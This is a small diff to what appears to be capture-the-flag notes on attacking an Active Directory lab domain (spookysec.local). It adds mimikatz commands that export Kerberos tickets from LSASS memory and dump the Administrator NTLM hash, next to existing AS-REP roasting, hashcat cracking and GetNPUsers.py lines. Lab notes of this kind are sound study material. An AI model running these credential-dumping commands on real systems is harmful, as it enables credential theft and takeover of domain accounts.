@@ -417,6 +417,17 @@ Rubeus.exe asreproast
 hashcat -m 18200 hash.txt Pass.txt --force
 ```
 
+dump TGT from LSASS memory
+```
+mimikatz
+sekurlsa::tickets /export
+```
+dump NTLM hash of admin account
+```
+mimikatz # lsadump::lsa /inject /name:Administrator
+```
+
+
 Which user account can you query a ticket from with no password?
 ```
 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
